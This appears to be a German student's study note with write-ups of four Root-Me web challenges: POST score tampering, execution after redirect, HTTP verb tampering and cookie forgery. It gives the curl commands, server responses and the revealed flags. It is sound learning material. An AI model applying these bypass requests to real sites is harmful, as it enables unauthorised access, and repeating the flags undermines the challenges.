---
created:
  - "{{date: DD-MM-YYYY}} {{time}}"
aliases:
  - "Course Code:"
  - IT-Security
tags:
  - Course/
---
# Root-Me HTTP Dokumentation

## 🧩 Challenge-Ziel (HTTP-Post)

**Ziel:** Das Ziel dieser Challenge besteht darin, die serverseitige Verarbeitung von HTTP-POST-Anfragen zu manipulieren, um einen Highscore von **999999** oder höher zu erreichen. Die bereitgestellte HTML-Seite enthält ein Formular, das beim Absenden einen zufälligen Score generiert. Unser Ziel ist es, diesen Mechanismus zu umgehen und einen gewünschten Score direkt an den Server zu senden.

### 🧠 Analyse der Webseite

Beim Aufrufen der Challenge-Seite unter:​

`http://challenge01.root-me.org/web-serveur/ch56/`

wird folgendes HTML-Formular angezeigt:​


```html
<form action="" method="post" onsubmit="document.getElementsByName('score')[0].value = Math.floor(Math.random() * 1000001)">
    <input type="hidden" name="score" value="-1" />
    <input type="submit" name="generate" value="Give a try!">
</form>
```

Hierbei wird beim Absenden des Formulars mittels JavaScript ein zufälliger Wert zwischen 0 und 1.000.000 generiert und als Wert des versteckten Feldes `score` gesetzt. Da die Validierung clientseitig erfolgt, können wir dies umgehen, indem wir direkt eine HTTP-POST-Anfrage mit einem manipulierten Score senden.

Wir schauen im Entwicklertool vom Browser wo sich die POST-Anfrage befindet und kopieren dern cURL befehl. Diesen verändern wir bei `score=1000000` und senden diesen als cmd Befehl über die konsole. Als Antwort erhalten wir in unserer Konsole die HTML-Seite mit dem richtigen Ergebnis und der Lösung.

**Kopierte Post anfrage als cURL**
```
curl ^"http://challenge01.root-me.org/web-serveur/ch56/^" ^
  -H ^"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7^" ^
  -H ^"Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7^" ^
  -H ^"Cache-Control: max-age=0^" ^
  -H ^"Connection: keep-alive^" ^
  -H ^"Content-Type: application/x-www-form-urlencoded^" ^
  -b ^"_ga=GA1.1.1454924502.1745766922; _ga_SRYSKX09J7=GS1.1.1745781207.3.1.1745781207.0.0.0^" ^
  -H ^"Origin: http://challenge01.root-me.org^" ^
  -H ^"Referer: http://challenge01.root-me.org/web-serveur/ch56/^" ^
  -H ^"Upgrade-Insecure-Requests: 1^" ^
  -H ^"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36^" ^
  --data-raw ^"score=703828^&generate=Give+a+try^%^21^" ^
  --insecure
```


**Angepasste Anfrage für Konsole**
`curl -X POST -d "score=1000000&generate=Give+a+try%21" http://challenge01.root-me.org/web-serveur/ch56/
`

```html
C:\Users\nico->curl -X POST -d "score=1000000&generate=Give+a+try%21" http://challenge01.root-me.org/web-serveur/ch56/
<!DOCTYPE html>
<html>
    <head>
        <title>HTTP Basics</title>
    </head>

   <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <h1>RandGame</h1>
        <h2>Human vs. Machine</h2>
        <hr>
        <p>Here is my new game. It's not totally finished but I'm sure nobody can beat me! ;)</p>
        <ul>
            <li>Rules: click on the button to hope to generate a great score</li>
            <li>Score to beat: <strong>999999</strong></li>
        </ul>

        <p>Wow, 1000000! How did you do that? :o</p><p>Flag to validate the challenge: <strong>H7tp_h4s_N0_s3Cr37S_F0r_y0U
</strong></p>
        <form action="" method="post" onsubmit="document.getElementsByName('score')[0].value = Math.floor(Math.random() * 1000001)">
            <input type="hidden" name="score" value="-1" />
            <input type="submit" name="generate" value="Give a try!">
        </form>
    </body>
</html>
```

![[IT-Security-HTTP-Post.png]]

---

## 🧩 Challenge-Ziel (HTTP - Improper Redirect)

**Ziel:** Diese Challenge demonstriert eine häufige Schwachstelle in PHP-Anwendungen, bei der nach einer Weiterleitung mittels `header('Location: ...')` kein `exit();` oder `die();` aufgerufen wird. Dadurch wird der nachfolgende Code weiterhin ausgeführt und an den Client gesendet, obwohl eine Weiterleitung stattgefunden hat.​

### 🧠 Analyse der Webseite

Beim Aufrufen der Challenge-Seite unter:​

`http://challenge01.root-me.org/web-serveur/ch32/`

wird ein Login-Formular angezeigt. Nach dem Absenden des Formulars mit beliebigen Zugangsdaten erfolgt eine Weiterleitung.​

### 🛠️ Lösungsschritte

1. **HTTP-Antwort analysieren:** Um die vollständige HTTP-Antwort einschließlich der Header und des Body zu sehen, verwenden wir den folgenden Befehl:

    `curl -i http://challenge01.root-me.org/web-serveur/ch32/`

**Erklärung:**

- `-i`: Zeigt die HTTP-Header der Antwort an.
- Die URL ist die Adresse der Challenge.​

2. **Analyse der Antwort:** Die Antwort enthält eine `302 Found`-Weiterleitung, gefolgt vom HTML-Inhalt der ursprünglichen Seite. In diesem HTML-Inhalt finden wir den Flag.

```html
C:\Users\nico->curl -i http://challenge01.root-me.org/web-serveur/ch32/

HTTP/1.1 302 Found
Server: nginx
Date: Mon, 28 Apr 2025 16:04:28 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: ./login.php?redirect

<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<h1>Welcome !</h1>

<p>Yeah ! The redirection is OK, but without exit() after the header('Location: ...'), PHP just continue the execution and send the page content !...</p>
<p><a href="http://cwe.mitre.org/data/definitions/698.html">CWE-698: Execution After Redirect (EAR)</a></p>
<p>The flag is : ExecutionAfterRedirectIsBad
</p>
</body>
</html>
```

### 📝 Hintergrundinformation

In PHP sollte nach einer Weiterleitung mittels `header("Location: ...")` immer ein `exit();` oder `die();` folgen, um sicherzustellen, dass kein weiterer Code ausgeführt wird. In dieser Challenge wurde dies absichtlich weggelassen, wodurch der nachfolgende HTML-Inhalt (inklusive des Flags) weiterhin an den Client gesendet wird, obwohl eine Weiterleitung stattgefunden hat.

---

## 🧩 Challenge-Ziel (HTTP - Verb Tampering)

**Ziel:** Diese Challenge demonstriert eine Schwachstelle, bei der durch die Manipulation des HTTP-Verbs (auch bekannt als HTTP-Methode) Zugriff auf Ressourcen erlangt werden kann, die normalerweise durch Zugriffskontrollen geschützt sind.​

### 🧠 Analyse der Webseite

Beim Aufrufen der Challenge-Seite unter:​

`http://challenge01.root-me.org/web-serveur/ch8/`

wird der Zugriff verweigert. Dies deutet darauf hin, dass bestimmte HTTP-Methoden (wie GET oder POST) durch Zugriffskontrollen eingeschränkt sind.​


### 🛠️ Lösungsschritte

1. **Senden einer Anfrage mit einer alternativen HTTP-Methode:** Um die Zugriffskontrolle zu umgehen, senden wir eine Anfrage mit einer anderen HTTP-Methode, beispielsweise `OPTIONS`.
    
    **Verwenden von `curl`:**
```
curl -X OPTIONS "http://challenge01.root-me.org/web-serveur/ch8/" ^
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" ^
  -H "Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7" ^
  -H "Cache-Control: max-age=0" ^
  -H "Connection: keep-alive" ^
  -b "_ga=GA1.1.1454924502.1745766922; _ga_SRYSKX09J7=GS1.1.1745781207.3.1.1745781207.0.0.0" ^
  -H "Upgrade-Insecure-Requests: 1" ^
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" ^
  --insecure

```   
**Erklärung:**
- `-X OPTIONS`: Gibt an, dass die HTTP-Methode `OPTIONS` verwendet wird.
    
- Die URL ist die Adresse der Challenge.​
    

2. **Analysieren der Serverantwort:** Die Serverantwort sollte Informationen über die unterstützten HTTP-Methoden enthalten. Wenn die Zugriffskontrolle nur für bestimmte Methoden implementiert ist, könnte die Verwendung einer alternativen Methode wie `OPTIONS` den Zugriff ermöglichen.
    
3. **Extrahieren des Flags:** Wenn die Anfrage erfolgreich ist, sollte die Serverantwort den Flag enthalten.
    
    **Auszug der Ausgabe:**

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html><head>
</head>

<h1>Mot de passe / password : a23e$dme96d3saez$$prap
</h1>
</body></html>
```

In diesem Beispiel lautet der Flag: `a23e$dme96d3saez$$prap`
### 📝 Hintergrundinformation

HTTP Verb Tampering tritt auf, wenn ein Webserver oder eine Anwendung Zugriffskontrollen basierend auf HTTP-Methoden implementiert, jedoch nicht alle Methoden ordnungsgemäß überprüft. Angreifer können alternative oder weniger häufig verwendete HTTP-Methoden verwenden, um Zugriff auf geschützte Ressourcen zu erhalten oder Sicherheitsmechanismen zu umgehen.

---

## 🧩 Challenge-Ziel (HTTP - Cookies)

**Ziel:** Diese Challenge demonstriert eine Schwachstelle in der Cookie-Verwaltung, bei der durch Manipulation von Cookies Zugriff auf administrative Funktionen erlangt werden kann.​


### 🧠 Analyse der Webseite

Beim Aufrufen der Challenge-Seite unter:​

`http://challenge01.root-me.org/web-serveur/ch7/`

wird ein Formular angezeigt, in dem eine E-Mail-Adresse eingegeben werden kann. Nach dem Absenden wird eine Bestätigung angezeigt, dass die E-Mail gespeichert wurde. Es gibt auch einen Link mit der Bezeichnung "Saved email addresses". Beim Klicken auf diesen Link erscheint die Meldung "You need to be admin".​

```html
<br/>
<br/>
<fieldset>

<form method="POST" action="" name="a">
Email<br/>
<input type="text" name="mail" size="20" class="post2" value=""><br/><br/>
<input type="submit" name="jsep4b" size="20" class="post2" value="send"><br/><br/>
</form><!--SetCookie("ch7","visiteur");--><a href="?c=visiteur">Saved email adresses</a><br/>You need to be admin<br/>Email saved<br/></fieldset>
```

Im HTML-Quellcode ist folgender Kommentar zu finden:​

`<!--SetCookie("ch7","visiteur");-->`

Dies deutet darauf hin, dass ein Cookie namens `ch7` mit dem Wert `visiteur` gesetzt wird.​


### 🛠️ Lösungsschritte

1. **Senden einer POST-Anfrage:** Zuerst senden wir eine POST-Anfrage, um den Cookie `ch7` zu erhalten.
    
    **Verwenden von `curl`:**
    
    `curl -i -X POST -d "mail=test@example.com&jsep4b=send" http://challenge01.root-me.org/web-serveur/ch7/`
    

**Erklärung:**

- `-i`: Zeigt die HTTP-Header der Antwort an.
- `-X POST`: Verwendet die HTTP-Methode POST.
- `-d`: Sendet die angegebenen Daten im Body der Anfrage.​
    

In der Antwort sollte ein `Set-Cookie`-Header vorhanden sein, der den Cookie `ch7=visiteur` setzt.

2. **Manipulieren des Cookies:** Nun ändern wir den Wert des Cookies `ch7` von `visiteur` zu `admin` und senden eine GET-Anfrage, um die gespeicherten E-Mail-Adressen abzurufen.
    
    **Verwenden von `curl`:**
    `curl -i -b "ch7=admin" http://challenge01.root-me.org/web-serveur/ch7/?c=admin`
    
**Erklärung:**
- `-b "ch7=admin"`: Setzt den Cookie `ch7` auf den Wert `admin`.​

```
C:\Users\nico->curl -i -b "ch7=admin" http://challenge01.root-me.org/web-serveur/ch7/?c=admin


HTTP/1.1 200 OK
Server: nginx
Date: Mon, 28 Apr 2025 16:36:34 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding

<div>Validation password : ml-SYMPA
</div></fieldset>
C:\Users\nico->
```

### 📝 Hintergrundinformation

Diese Challenge zeigt, wie wichtig eine sichere Verwaltung von Cookies ist. Wenn der Zugriff auf administrative Funktionen lediglich durch den Wert eines Cookies gesteuert wird, können Angreifer durch Manipulation dieses Cookies unbefugten Zugriff erlangen. Es ist daher entscheidend, dass Server die Authentizität und Integrität von Cookies überprüfen und nicht allein auf deren Vorhandensein oder Wert vertrauen.
